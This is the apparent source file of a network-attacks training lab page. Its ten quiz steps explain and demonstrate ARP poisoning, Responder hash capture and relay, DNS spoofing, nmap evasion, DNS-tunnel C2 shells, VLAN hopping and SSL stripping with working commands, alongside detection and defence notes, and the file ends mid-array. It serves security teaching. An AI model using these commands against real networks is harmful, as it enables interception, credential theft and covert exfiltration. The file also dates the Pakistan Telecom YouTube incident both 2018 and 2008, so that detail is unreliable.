'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#00ffff'
const moduleId = 'network-attacks'
const moduleName = 'Network Attacks'
const moduleNum = '08'

const steps: LabStep[] = [

  // ── SECTION 1: Packet Analysis ────────────────────────────────────────────────
  {
    id: 'network-01',
    title: 'Wireshark — Deep Packet Inspection',
    objective: `You capture traffic from a corporate network and open the pcap in Wireshark. You need to find HTTP Basic Authentication credentials — the username and password are base64-encoded in the Authorization header.

What Wireshark display filter shows only HTTP packets that contain an Authorization header (HTTP Basic Auth)?`,
    hint: 'Wireshark uses http.authbasic as the filter field for HTTP Basic Auth credentials.',
    answers: ['http.authbasic', 'http.authorization', 'http contains "Authorization"', 'http.request.method'],
    xp: 15,
    explanation: `Wireshark is the industry-standard packet analysis tool. Key display filters:

  http                       — all HTTP traffic
  http.authbasic             — HTTP Basic Auth credentials (plaintext base64)
  http.request.method == "POST"  — capture form submissions
  dns                        — DNS queries and responses
  ftp                        — FTP control channel (credentials in plaintext)
  ftp-data                   — FTP data transfer
  smtp                       — email traffic
  tls                        — encrypted TLS handshakes
  tcp.port == 8080           — traffic on specific port
  ip.addr == 192.168.1.10    — traffic to/from specific host
  tcp.flags.syn == 1 and tcp.flags.ack == 0  — SYN packets (port scans)

Extracting credentials from pcap:
  HTTP Basic Auth: Filter http.authbasic → Value column shows base64 → decode with: echo "base64value" | base64 -d
  FTP credentials: Filter ftp and look for USER and PASS commands in Packet Bytes
  Telnet: All data is plaintext — follow TCP stream (Right-click → Follow → TCP Stream)

Useful features:
  Statistics → Conversations: who is talking to whom, how much data
  Statistics → Protocol Hierarchy: breakdown of protocols in capture
  File → Export Objects → HTTP: extract all files transferred over HTTP
  Right-click → Follow → TCP/HTTP Stream: reassemble full session content

Tshark (command-line Wireshark):
  tshark -r capture.pcap -Y http.authbasic -T fields -e http.authbasic
  → Extracts all Basic Auth values from a pcap file non-interactively`
  },

  {
    id: 'network-02',
    title: 'Packet Capture — tcpdump Mastery',
    objective: `You need to capture specific traffic: all TCP SYN packets (to detect port scanning) from any host targeting your server at 192.168.1.100.

What tcpdump filter captures only TCP SYN packets (initial connection requests, not SYN-ACK)?`,
    hint: 'TCP flags are accessed with tcp[tcpflags]. SYN flag is tcp-syn. The filter is: tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0',
    answers: [
      'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0',
      'tcp[tcpflags] == tcp-syn',
      'tcp[13] == 2',
      "'tcp[tcpflags] & tcp-syn != 0'"
    ],
    xp: 15,
    explanation: `tcpdump filter syntax:

  # Capture SYN packets (port scan detection)
  tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0'

  # Capture traffic to/from specific host
  tcpdump -i eth0 host 192.168.1.10

  # Capture traffic on specific port
  tcpdump -i eth0 port 443

  # Capture traffic excluding SSH (don't capture your own session)
  tcpdump -i eth0 not port 22

  # Capture DNS queries
  tcpdump -i eth0 port 53

  # Capture all traffic and save to file
  tcpdump -i eth0 -w capture.pcap

  # Read and filter existing pcap
  tcpdump -r capture.pcap -n 'port 80'

  # Show first 100 bytes of each packet payload
  tcpdump -i eth0 -X -s 100

Flags:
  -i    interface
  -w    write to file
  -r    read from file
  -n    don't resolve names (faster, shows IPs)
  -X    show hex and ASCII
  -s    snap length (how many bytes to capture per packet, 0 = full packet)
  -v / -vv / -vvv  — verbosity levels

Capturing from remote host (via SSH tunnel):
  ssh user@remote "tcpdump -i eth0 -w - not port 22" | wireshark -k -i -
  → Streams remote capture directly into local Wireshark`
  },

  // ── SECTION 2: LAN Attacks ────────────────────────────────────────────────────
  {
    id: 'network-03',
    title: 'ARP Poisoning — Man-in-the-Middle',
    objective: `You are on a local network (192.168.1.0/24) and want to intercept traffic between victim (192.168.1.50) and the gateway (192.168.1.1). You will use ARP poisoning to redirect traffic through your machine.

Before running arpspoof, what kernel parameter must you enable to ensure traffic passes through your machine rather than being dropped?`,
    hint: 'IP forwarding: echo 1 into the /proc/sys/net/ipv4/ip_forward file.',
    answers: [
      'echo 1 > /proc/sys/net/ipv4/ip_forward',
      'ip_forward',
      'net.ipv4.ip_forward',
      'sysctl -w net.ipv4.ip_forward=1'
    ],
    xp: 20,
    explanation: `IP forwarding enables your machine to route packets rather than drop them:
  echo 1 > /proc/sys/net/ipv4/ip_forward
  OR: sysctl -w net.ipv4.ip_forward=1

Full ARP poisoning attack (arpspoof):
  # Terminal 1: Tell victim that gateway's MAC is yours
  arpspoof -i eth0 -t 192.168.1.50 192.168.1.1

  # Terminal 2: Tell gateway that victim's MAC is yours
  arpspoof -i eth0 -t 192.168.1.1 192.168.1.50

  # Terminal 3: Capture intercepted traffic
  tcpdump -i eth0 host 192.168.1.50 -w victim_traffic.pcap

bettercap (modern, all-in-one):
  bettercap -iface eth0
  bettercap> net.probe on        — discover hosts
  bettercap> set arp.spoof.targets 192.168.1.50
  bettercap> arp.spoof on        — start poisoning
  bettercap> net.sniff on        — capture traffic

What you can capture after ARP poisoning:
  - HTTP credentials (forms, Basic Auth)
  - FTP/Telnet/SMTP credentials (plaintext protocols)
  - SMB NTLMv2 challenge-responses (crack or relay)
  - DNS queries (redirect to phishing sites)
  - Session cookies (for replay attacks)

Detection:
  Abnormal ARP replies (gratuitous ARPs) to multiple hosts
  ARP table changes where MAC addresses change frequently
  XArp (Windows GUI tool) alerts on ARP poisoning in real time

Defence:
  Dynamic ARP Inspection (DAI) on managed switches
  ARP watch on critical servers
  Static ARP entries for gateway on critical machines`
  },

  {
    id: 'network-04',
    title: 'Responder — LLMNR/NBT-NS Poisoning',
    objective: `Responder is one of the most effective tools on internal networks. When a Windows machine fails to resolve a hostname via DNS, it broadcasts LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) queries to the entire subnet.

Responder answers these broadcasts with its own IP, causing the victim to send NTLM authentication to Responder. What Responder flag runs it on a specific interface and enables all poisoners?`,
    hint: 'The interface flag is -I followed by the interface name. Example: responder -I eth0',
    answers: ['responder -I eth0', '-I eth0', 'responder -I eth0 -rdwv', '-I'],
    flag: 'FLAG{responder_deployed}',
    xp: 20,
    explanation: `responder -I eth0 -rdwv

Flags:
  -I  interface
  -r  enable NBNS for WraptUp (legacy feature)
  -d  enable DHCP poisoning
  -w  start WPAD rogue server (captures proxy auth creds from browsers)
  -v  verbose output

What Responder captures:
  NTLMv2 hashes from:
  - Failed file share lookups (\\\\FILESERVER01 that doesn't exist)
  - Browser proxy auto-discovery (WPAD)
  - Printer share lookups
  - Any hostname resolution failure

Captured hashes appear in:
  /usr/share/responder/logs/
  Format: NTLMv2 challenge-response hash (hashcat mode 5600)

Cracking captured hashes:
  hashcat -m 5600 ntlmv2.hash rockyou.txt -r best64.rule
  → NTLMv2 cracks slower than NTLM but weaker passwords still fall quickly

NTLM relay (if you can't crack):
  Use ntlmrelayx instead of Responder to relay the captured creds:
  Disable SMB/HTTP in Responder → run ntlmrelayx → captured creds forwarded to real targets

Responder success indicators:
  [+] Poisoned answer sent to 192.168.1.X for name FILESERVER
  [SMB] NTLMv2-SSP Client: 192.168.1.X
  [SMB] NTLMv2-SSP Username: DOMAIN\\username
  [SMB] NTLMv2-SSP Hash: username::DOMAIN:hash...

Defence: Disable LLMNR via Group Policy (Turn Off Multicast Name Resolution = Enabled), disable NetBIOS over TCP/IP on all adapters.`
  },

  {
    id: 'network-05',
    title: 'DNS Spoofing and Hijacking',
    objective: `After ARP poisoning a victim machine, you can intercept their DNS queries and return fake responses, redirecting them to your phishing server.

bettercap has a built-in DNS server module. What is the name of the bettercap module that intercepts DNS queries and returns spoofed responses?`,
    hint: 'The bettercap module for DNS spoofing is dns.spoof.',
    answers: ['dns.spoof', 'bettercap dns.spoof', 'set dns.spoof.all true', 'dns spoof'],
    xp: 15,
    explanation: `bettercap DNS spoofing:

  bettercap> set dns.spoof.all true                    — spoof all DNS queries
  bettercap> set dns.spoof.domains "*.target.com"      — spoof only target.com
  bettercap> set dns.spoof.address 192.168.1.100       — redirect to your server
  bettercap> dns.spoof on

  Combined with ARP poisoning:
  bettercap> arp.spoof on
  bettercap> dns.spoof on
  → Victim's DNS queries for target.com return 192.168.1.100 (your server)

ettercap DNS spoofing (classic):
  Edit /etc/ettercap/etter.dns:
    *.target.com     A    192.168.1.100
    target.com       A    192.168.1.100

  ettercap -T -q -i eth0 -P dns_spoof -M arp /victim// /gateway//

DNS attack scenarios:
  Credential capture — redirect target.com to phishing page that mirrors the real one
  Email hijacking    — redirect MX records to your SMTP server (if victim does DNS MX lookup)
  Update hijacking   — redirect software update servers to serve malicious updates
  Internal SSRF bypass — redirect internal hostnames to external attacker-controlled servers

Authoritative DNS cache poisoning (Kaminsky attack — external):
  Different from LAN spoofing — poisons the recursive resolver's cache
  Requires guessing the transaction ID (16-bit) before the real response arrives
  Mitigation: DNSSEC (cryptographically signed DNS records), DNS over HTTPS (DoH)

Detection:
  Query rate anomalies: many NX responses from DNS server = failed lookups = potential C2/recon
  RPZ (Response Policy Zone) can block malicious domains at the DNS resolver level`
  },

  // ── SECTION 3: Scanning and Evasion ──────────────────────────────────────────
  {
    id: 'network-06',
    title: 'Advanced Nmap — Evasion and OS Fingerprinting',
    objective: `A firewall is blocking your standard SYN scans. You want to use a technique that sends packets with specific flag combinations that may confuse stateless firewalls while still revealing open ports.

What nmap scan type sends packets with no TCP flags set — a "NULL" scan — which some firewalls don't filter?`,
    hint: 'The flag for NULL scan (no TCP flags set) is -sN.',
    answers: ['-sN', 'nmap -sN', 'null scan', 'sN'],
    xp: 15,
    explanation: `Nmap scan types for firewall evasion:

  -sN  NULL scan       — no flags set; closed ports send RST, open ports drop packet
  -sF  FIN scan        — only FIN flag; same response pattern as NULL
  -sX  Xmas scan       — FIN+PSH+URG set; same response pattern

These bypass some stateless packet filters that only block SYN packets. However, they don't work on Windows (Windows always sends RST regardless of flag combination).

OS fingerprinting:
  nmap -O 192.168.1.10           — OS detection (requires root, sends multiple probe types)
  nmap -A 192.168.1.10           — -O + -sV + --script=default + traceroute (all-in-one aggressive)

Decoy scanning (hide your IP among fake scanners):
  nmap -D RND:10 192.168.1.10    — generate 10 random decoy IPs to confuse IDS logs
  nmap -D 10.0.0.1,10.0.0.2 192.168.1.10  — specific decoys

Timing and throttling (IDS evasion):
  nmap -T1 --scan-delay 5s 192.168.1.10   — ultra slow, evades rate-based IDS
  nmap --data-length 25 192.168.1.10      — add random padding bytes to packets

Fragmented packets:
  nmap -f 192.168.1.10           — fragment packets into 8-byte chunks
  nmap -mtu 24 192.168.1.10      — specify MTU for fragmentation

Source port manipulation:
  nmap --source-port 53 192.168.1.10     — send packets from port 53 (DNS — often allowed through firewalls)
  nmap --source-port 80 192.168.1.10     — from port 80 (HTTP — often allowed outbound)`
  },

  {
    id: 'network-07',
    title: 'Tunnelling — SSH and DNS Covert Channels',
    objective: `You are inside a restricted network where all outbound traffic except DNS (port 53) is blocked. You need to exfiltrate data or establish a covert C2 channel.

DNS tunnelling encodes data in DNS queries. What open-source tool creates a full IP tunnel over DNS, establishing a usable VPN-like connection through DNS queries?`,
    hint: 'The tool is iodine — it creates a tun interface that tunnels all IP traffic over DNS.',
    answers: ['iodine', 'dnscat2', 'dns2tcp', 'iodine -f', 'iodined'],
    xp: 20,
    explanation: `DNS Tunnelling with iodine:

  # Server side (internet-accessible, needs a DNS domain you control)
  iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com

  # Client side (inside restricted network)
  iodine -f -P password tunnel.yourdomain.com
  → Creates tun0 interface at 10.0.0.2 → all traffic routes through DNS

How it works:
  Client encodes data in DNS query names: <base32_data>.tunnel.yourdomain.com
  Server receives these at the authoritative DNS server and decodes them
  Response data encoded in TXT record responses
  Bandwidth: ~1-3 Kbps (very slow but works in DNS-only environments)

dnscat2 (C2 over DNS, no root required):
  Server: ruby dnscat2.rb --dns "domain=yourdomain.com"
  Client: ./dnscat yourdomain.com
  → Interactive shell sessions over DNS

SSH tunnelling (when SSH is permitted):
  # Dynamic SOCKS proxy (full web proxy)
  ssh -D 1080 -N user@external_server
  → Set browser proxy to SOCKS5 127.0.0.1:1080

  # Local port forward (access internal service externally)
  ssh -L 8080:internal_server:80 -N user@jumphost
  → Access internal web server at localhost:8080

  # Remote port forward (expose internal service to internet)
  ssh -R 9090:localhost:80 user@public_server
  → public_server:9090 reaches your local port 80

ICMP tunnelling:
  ptunnel — tunnels TCP over ICMP (useful if only ICMP is allowed)
  icmpsh  — simple reverse shell over ICMP echo/reply

Detection of tunnelling:
  DNS: Unusually long query names, high query volume to single domain, unusual record types (TXT), queries outside business hours
  SSH: Unusually long connections, high data volume on port 22`
  },

  {
    id: 'network-08',
    title: 'VLAN Hopping — 802.1Q Double Tagging',
    objective: `VLANs are used to segment network traffic — a host in VLAN 10 shouldn't be able to reach VLAN 20. But VLAN hopping attacks can break this isolation.

Double-tagging: you craft a frame with two 802.1Q VLAN tags. The first switch strips the outer tag (your VLAN) and forwards it to another switch which processes the inner tag (target VLAN).

This attack only works in one direction. What is the prerequisite for double-tagging to work — what must the attacker's port be configured as on the switch?`,
    hint: 'The attacker must be on the native VLAN of a trunk port, or their port must be the same as the native VLAN.',
    answers: ['native vlan', 'trunk port native vlan', 'native vlan same as target', 'vlan 1 native'],
    xp: 20,
    explanation: `VLAN hopping attack requirements:
  - Attacker must be on the native VLAN (often VLAN 1, the default)
  - Target VLAN must be carried on a trunk port that uses the same native VLAN
  - The switch must be in "auto" trunking mode (Dynamic Trunking Protocol)

Double-tagging packet structure:
  [Outer tag: VLAN 1][Inner tag: VLAN 20][Payload]
  → Switch 1 strips outer tag, sends to trunk port to switch 2
  → Switch 2 strips inner tag, delivers to VLAN 20

Switch Spoofing (alternative VLAN hop):
  DTP (Dynamic Trunking Protocol) allows switches to automatically negotiate trunk links.
  An attacker can send DTP frames to trick the switch into thinking their PC is another switch:
    yersinia -G    — GUI tool for Layer 2 attacks including DTP spoofing

Defences:
  Set all unused ports to a non-default VLAN (not VLAN 1)
  Change the native VLAN on all trunk ports to an unused VLAN (e.g., VLAN 999)
  Disable DTP on all access ports: switchport nonegotiate
  Use "switchport access vlan X" instead of relying on native VLAN

Scapy for crafting double-tagged frames:
  from scapy.all import *
  pkt = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst="10.20.0.1")/ICMP()
  sendp(pkt, iface="eth0")`
  },

  {
    id: 'network-09',
    title: 'MITM HTTPS — SSL Stripping and Certificate Attacks',
    objective: `Even after successfully intercepting HTTPS traffic via ARP poisoning, the browser shows "Not Secure" because your certificate isn't trusted. SSL stripping downgrades HTTPS to HTTP transparently.

What is the name of the attack where the attacker presents a different (attacker-controlled) certificate to the victim while maintaining a legitimate TLS connection to the real server?`,
    hint: 'The attacker is in the middle of two TLS connections — it is called SSL/TLS interception or a TLS Man-in-the-Middle (MITM) attack.',
    answers: ['ssl mitm', 'tls mitm', 'ssl interception', 'ssl stripping', 'certificate pinning bypass'],
    xp: 15,
    explanation: `SSL/TLS MITM approaches:

  1. SSL Stripping (sslstrip):
     Downgrades HTTPS to HTTP transparently
     Works when: site doesn't implement HSTS
     sslstrip -l 8080 + iptables redirect HTTPS traffic to port 8080

  2. Certificate substitution:
     Present your own certificate (signed by your own CA)
     Works when: victim has imported your CA as trusted (rare outside corporate networks)
     Corporate proxies do this legitimately for content inspection

  3. Fake CA in corporate environment:
     IT department installs corporate CA on all company devices
     Corporate proxy (Zscaler, Palo Alto, etc.) decrypts all HTTPS for content inspection
     From a pentest perspective, any machine with untrusted CAs in cert store is suspicious

  SSL stripping with bettercap:
    bettercap> set https.proxy.sslstrip true
    bettercap> https.proxy on
    → Victim's browser shows HTTP, all data captured in plaintext

  Certificate Transparency defence:
    Browsers check CT logs for valid certificates → rogue certs can be detected
    Certificate pinning — app only accepts specific certificate → defeats any MITM

  HSTS (HTTP Strict Transport Security):
    Browsers remember "always use HTTPS for this domain" after first visit
    Defeats SSL stripping for sites already visited
    HSTS preload (hstspreload.org) — browsers ship with list of HSTS-only domains`
  },

  {
    id: 'network-10',
    title: 'BGP Hijacking — Internet Routing Attacks',
    objective: `BGP (Border Gateway Protocol) is how the internet routes traffic between Autonomous Systems (ISPs, large networks). BGP has no authentication by default — any AS can announce routes for any IP prefix.

BGP hijacking has been used to redirect traffic globally. In 2018, a Pakistan Telecom BGP leak accidentally took YouTube offline. In 2010, China Telecom briefly routed 15% of global internet traffic through China.

What security standard adds cryptographic signatures to BGP route announcements to prevent hijacking?`,
    hint: 'The IETF standard that secures BGP route origins with cryptographic signatures is RPKI.',
    answers: ['rpki', 'RPKI', 'Resource Public Key Infrastructure', 'route origin validation'],
    flag: 'FLAG{routing_secured}',
    xp: 20,
    explanation: `BGP hijacking types:

  Route origin hijacking: announce that you own an IP prefix you don't (traffic flows to attacker)
  Route leak: announce more specific routes than intended, attracting transit traffic
  Sub-prefix hijack: announce /25 instead of /24 — more specific routes win in BGP, diverts half the traffic

Real-world BGP hijacking incidents:
  2008 Pakistan Telecom: accidentally announced YouTube's prefixes → YouTube down globally for 2 hours
  2010 China Telecom: 18-minute "malfunction" that redirected US gov, military, and internet traffic through China
  2018 Amazon Route53 BGP hijack: myetherwallet.com hijacked, users redirected to phishing site → $152k stolen
  2019 Telexio BGP leak: large portions of Cloudflare traffic rerouted through a small Swiss ISP

RPKI (Resource Public Key Infrastructure):
  ROA (Route Origin Authorization): a signed statement saying "AS 12345 is authorized to announce 203.0.113.0/24"
  Routers with RPKI validation reject routes with invalid origin ASNs
  Adoption: ~45% of internet routes now have valid ROA records (slowly improving)

BGPsec (more advanced):
  Cryptographically signs each hop in the AS path (full path validation, not just origin)
  Much harder to deploy, low adoption

Tools for BGP monitoring:
  RIPE Stat (stat.ripe.net) — BGP routing table analysis
  BGPmon — alerts on BGP changes for your prefixes
  Cloudflare Radar — real-time BGP anomaly detection`
  },

]

export default function NetworkAttacksLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

  const sections = [
    { num: '01-02', title: 'Packet Analysis — Wireshark & tcpdump', color: accent },
    { num: '03-05', title: 'LAN Attacks — ARP, Responder, DNS', color: accent },
    { num: '06-07', title: 'Scanning, Evasion & Tunnelling', color: accent },
    { num: '08-09', title: 'VLAN Hopping & SSL MITM', color: accent },
    { num: '10',    title: 'BGP Hijacking & Routing Attacks', color: accent },
  ]

  useEffect(() => {
    const saved = localStorage.getItem('lab_network-attacks-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#005a5a' }}>
        <Link href="/" style={{ color: '#005a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/network-attacks" style={{ color: '#005a5a', textDecoration: 'none' }}>NETWORK ATTACKS</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/network-attacks" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #003a3a', borderRadius: '3px', color: '#005a5a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(0,255,255,0.1)', border: '1px solid rgba(0,255,255,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(0,255,255,0.04)', border: '1px solid rgba(0,255,255,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#003a3a', border: p.active ? '2px solid ' + accent : '1px solid #003a3a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#005a5a', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#003a3a', margin: '0 2px' }}>&#8212;</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#3a8a8a' }}>
          MOD-{moduleNum} &nbsp;&#183;&nbsp; {moduleName.toUpperCase()} &nbsp;&#183;&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE &#8212; LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(0,255,255,0.1)', border: '1px solid rgba(0,255,255,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#005a5a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 &#8212; GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Network Attacks Lab</h1>
          </div>
        </div>

        <p style={{ color: '#3a8a8a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          Packet analysis, ARP poisoning, LLMNR/Responder, DNS spoofing, VLAN hopping, SSL stripping, DNS tunnelling, and BGP hijacking.
          Complete all {steps.length} steps to unlock Phase 2.
        </p>

        {/* Section index */}
        <div style={{ background: 'rgba(0,255,255,0.03)', border: '1px solid rgba(0,255,255,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#003a3a', letterSpacing: '0.25em', marginBottom: '10px' }}>LAB SECTIONS ({steps.length} STEPS &#183; {xpTotal} XP)</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '6px' }}>
            {sections.map((s) => (
              <div key={s.num} style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '5px 8px', background: 'rgba(0,255,255,0.04)', borderRadius: '4px', border: '1px solid rgba(0,255,255,0.08)' }}>
                <span style={{ fontSize: '7px', color: s.color, fontWeight: 700, minWidth: '32px' }}>{s.num}</span>
                <span style={{ fontSize: '7.5px', color: '#3a8a8a' }}>{s.title}</span>
              </div>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="network-attacks-lab"
          moduleId={moduleId}
          title="Network Attacks Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
          onRestart={() => { setGuidedDone(false); setFreeLaunched(false); setEarnedXp(0) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(0,255,255,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(0,255,255,0.4)' : '#003a3a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#005a5a', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#3a8a8a' : '#005a5a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 &#8212; FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#005a5a' }}>Full Network Attacks Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, background: 'rgba(0,255,255,0.08)', border: '1px solid rgba(0,255,255,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(0,255,255,0.04)' : '#040808', border: '1px solid ' + (guidedDone ? 'rgba(0,255,255,0.25)' : '#002a2a'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#3a8a8a' : '#003a3a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#005a5a', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['ARP poisoning', 'Responder', 'DNS spoofing', 'SSL stripping', 'DNS tunnelling', 'Wireshark analysis'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#003a3a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#3a8a8a' : '#003a3a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(0,255,255,0.6)' : '#003a3a'), borderRadius: '6px', background: guidedDone ? 'rgba(0,255,255,0.12)' : 'transparent', color: guidedDone ? accent : '#005a5a', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(0,255,255,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#003a3a' }}>Complete all {steps.length} guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#040808' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#060a0a', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#2a6a6a' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any network attack technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #003a3a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#2a6a6a', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '&#9660;' : '&#9658;'} QUICK REFERENCE &#8212; NETWORK ATTACK COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#040808', border: '1px solid #002a2a', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: '8px' }}>
              {[
                ['wireshark -r capture.pcap', 'Open pcap in Wireshark'],
